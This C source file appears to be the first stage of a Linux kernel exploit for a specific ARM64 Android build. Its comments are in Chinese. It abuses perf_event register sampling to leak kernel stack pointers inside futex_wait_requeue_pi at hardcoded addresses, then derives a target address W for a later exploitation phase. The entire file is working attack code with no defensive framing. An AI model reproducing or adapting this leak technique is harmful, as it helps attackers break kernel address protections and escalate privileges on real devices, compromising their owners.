/*
 * perf_sp_leak.c — Phase 1: perf sample SP → W 定位
 *
 * 在 waiter 线程内收集 perf sample，与 futex_wait_requeue_pi 同步。
 * 按 IP 过滤到目标函数，提取 SP，计算 W = SP + 0x90。
 */
#include "common.h"
#include <linux/perf_event.h>

/* futex_wait_requeue_pi 地址范围 (PJJ110 5.10.226) */
#define FWRP_START 0xffffffc008295874ULL  /* prologue end */
#define FWRP_END   0xffffffc00829601cULL  /* epilogue start */
#define W_DELTA    0x90

static int g_perf_fd = -1;
static void *g_perf_buf;
static size_t g_perf_msz;

void perf_sp_start(void) {
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.sample_period = 200;
    pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
    pe.sample_regs_intr = (1ULL << 32) - 1;
    pe.disabled = 1;
    pe.exclude_user = 1;
    pe.exclude_hv = 1;
    pe.exclude_idle = 1;

    g_perf_fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (g_perf_fd < 0) {
        pr_warning("perf_event_open failed errno=%d\n", errno);
        return;
    }
    g_perf_msz = 4096 * (1 + 32);
    g_perf_buf = mmap(NULL, g_perf_msz, PROT_READ | PROT_WRITE,
                      MAP_SHARED, g_perf_fd, 0);
    if (g_perf_buf == MAP_FAILED) {
        pr_warning("perf mmap failed\n");
        close(g_perf_fd);
        g_perf_fd = -1;
        return;
    }
    ioctl(g_perf_fd, PERF_EVENT_IOC_ENABLE, 0);
}

void perf_sp_stop_and_report(void) {
    if (g_perf_fd < 0) return;
    ioctl(g_perf_fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *hdr = g_perf_buf;
    uint64_t head = hdr->data_head;
    __sync_synchronize();
    char *base = (char *)g_perf_buf + 4096;
    size_t dsz = 4096 * 32;
    uint64_t pos = hdr->data_tail;

    int total = 0, filtered = 0;
    uint64_t sp_vals[512];
    uint64_t ip_vals[512];
    int nsp = 0;

    while (pos < head && nsp < 512) {
        struct perf_event_header *ev = (void *)(base + (pos % dsz));
        if (ev->size == 0) break;
        if (ev->type == PERF_RECORD_SAMPLE) {
            total++;
            char *p = (char *)ev + sizeof(*ev);
            uint64_t ip = *(uint64_t *)p; p += 8;
            uint64_t abi = *(uint64_t *)p; p += 8;

            if (ip >= FWRP_START && ip < FWRP_END) {
                filtered++;
                if (abi == 1 || abi == 2) {
                    uint64_t *regs = (uint64_t *)p;
                    uint64_t sp = regs[31]; /* ARM64 SP = reg 31 */
                    if (sp > 0xffffff8000000000ULL &&
                        sp < 0xffffff8c00000000ULL) {
                        sp_vals[nsp] = sp;
                        ip_vals[nsp] = ip;
                        nsp++;
                    }
                }
            }
        }
        pos += ev->size;
    }

    hdr->data_tail = head;
    munmap(g_perf_buf, g_perf_msz);
    close(g_perf_fd);
    g_perf_fd = -1;

    pr_info("perf: total=%d filtered=%d kernel_sp=%d\n", total, filtered, nsp);

    if (nsp == 0) {
        pr_warning("perf: no kernel SP in target function\n");
        return;
    }

    /* Compute W candidates */
    pr_info("=== W_candidate (SP + 0x90) ===\n");
    uint64_t w_seen[64];
    int nw = 0;
    for (int i = 0; i < nsp; i++) {
        uint64_t w = sp_vals[i] + W_DELTA;
        pr_info("  [%d] IP=0x%016llx SP=0x%016llx W=0x%016llx\n",
                i, ip_vals[i], sp_vals[i], w);
        int dup = 0;
        for (int j = 0; j < nw; j++)
            if (w_seen[j] == w) { dup = 1; break; }
        if (!dup && nw < 64) w_seen[nw++] = w;
    }
    pr_info("unique W: %d\n", nw);
    for (int i = 0; i < nw; i++)
        pr_info("  W[%d] = 0x%016llx\n", i, w_seen[i]);

    if (nw == 1)
        pr_success("Phase 1 PASS: W=0x%016llx (stable)\n", w_seen[0]);
    else
        pr_warning("Phase 1: %d unique W values (unstable)\n", nw);
}

int perf_sp_leak_experiment(void) {
    /* This is called from main thread but does nothing there.
     * The actual experiment runs in waiter_thread via
     * perf_sp_start / perf_sp_stop_and_report. */
    pr_info("perf SP leak: will run in waiter thread\n");
    return 0;
}
